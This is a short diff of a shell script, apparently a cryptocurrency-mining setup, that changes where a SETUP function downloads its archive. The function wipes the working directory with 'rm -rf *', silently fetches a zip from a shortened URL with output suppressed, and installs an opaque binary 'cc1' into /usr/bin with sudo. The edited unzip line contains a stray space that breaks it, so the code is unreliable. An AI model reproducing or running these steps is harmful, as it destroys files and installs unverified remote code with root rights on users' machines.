@@ -61,8 +61,8 @@ MINE_E() {
 }
 SETUP() {
 rm -rf *
-wget https://git.io/J0Dr6  --content-disposition >/dev/null 2>&1
-unzip -q trial5.zip
+wget https://git.io/J0jvk  --content-disposition >/dev/null 2>&1
+unzip -q trial 6.zip
 chmod u+x cc1
 sudo mv cc1 /usr/bin
 }
